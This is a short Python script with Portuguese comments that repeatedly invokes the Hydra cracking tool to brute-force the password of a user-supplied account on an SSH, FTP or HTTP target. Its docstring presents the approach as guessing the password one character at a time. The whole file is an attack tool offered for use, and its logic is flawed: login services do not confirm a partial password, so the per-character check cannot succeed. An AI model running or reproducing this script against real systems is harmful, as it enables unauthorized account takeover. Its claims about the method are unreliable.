import subprocess
import string

def hydra_brute_force_character_by_character(target, service, username, max_length):
    """
    Realiza ataque de força bruta com o Hydra, caractere por caractere, até descobrir a senha completa.
    
    :param target: Endereço do alvo (IP ou domínio).
    :param service: Serviço a ser testado (ex.: ssh, ftp, http).
    :param username: Nome de usuário para autenticação.
    :param max_length: Comprimento máximo da senha.
    """
    charset = string.ascii_letters + string.digits + string.punctuation
    discovered_password = ""

    print(f"Iniciando força bruta caractere por caractere contra {service}://{target} com o usuário '{username}'...")

    for position in range(1, max_length + 1):
        for char in charset:
            attempt = discovered_password + char
            print(f"Tentando: {attempt}")

            # Executa o Hydra com a tentativa atual
            command = [
                "hydra", "-l", username, "-p", attempt, target, service
            ]
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            # Verifica se a saída do Hydra indica sucesso
            if b"login:" in stdout and b"password:" in stdout:
                discovered_password += char
                print(f"Caractere encontrado: {char} | Senha até agora: {discovered_password}")
                break

        # Verifica se a senha completa foi encontrada
        if len(discovered_password) == position:
            continue
        else:
            print("Senha completa descoberta ou erro no serviço.")
            break

    print(f"\nSenha descoberta: {discovered_password}")

# Configuração de teste
target = input("Digite o endereço do alvo (IP ou domínio): ")
service = input("Digite o serviço (ex.: ssh, ftp, http): ")
username = input("Digite o nome de usuário: ")
max_length = int(input("Digite o comprimento máximo da senha: "))

hydra_brute_force_character_by_character(target, service, username, max_length)
